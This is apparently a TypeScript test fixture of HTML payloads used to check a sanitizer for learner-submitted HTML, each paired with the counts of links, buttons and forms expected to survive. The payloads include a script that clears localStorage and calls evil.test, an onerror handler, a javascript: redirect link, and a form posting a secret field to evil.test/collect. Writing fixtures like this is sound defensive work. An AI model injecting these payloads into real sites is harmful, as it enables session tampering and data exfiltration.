export interface SecurityPayload {
  readonly html: string;
  readonly expectedResidual: {
    readonly links: number;
    readonly buttons: number;
    readonly forms: number;
  };
}

/** 実行・通信能力を要求するlearner HTMLとsanitizer後に操作すべき安全な残存要素。 */
export const securityPayloads = {
  script: {
    html: '<main><script>parent.document.body.dataset.pwned="yes"; parent.localStorage.clear(); fetch("https://evil.test/script"); window.open("https://evil.test/popup")</script><h1>安全</h1></main>',
    expectedResidual: { links: 0, buttons: 0, forms: 0 },
  },
  event: {
    html: '<main><img src="https://evil.test/pixel" onerror="parent.document.body.dataset.pwned=\'yes\'; parent.localStorage.clear()"><h1>安全</h1></main>',
    expectedResidual: { links: 0, buttons: 0, forms: 0 },
  },
  schemes: {
    html: '<main><a href="javascript:parent.location=\'https://evil.test/javascript\'">危険Scheme</a><a href="https://evil.test/escape" target="_blank">外部Link</a><h1>安全</h1></main>',
    expectedResidual: { links: 2, buttons: 0, forms: 0 },
  },
  form: {
    html: '<form action="https://evil.test/collect" method="post" target="_top"><input name="secret" value="private"><button type="submit" formaction="https://evil.test/button">送信</button></form><h1>安全</h1>',
    expectedResidual: { links: 0, buttons: 1, forms: 1 },
  },
} as const satisfies Readonly<Record<string, SecurityPayload>>;
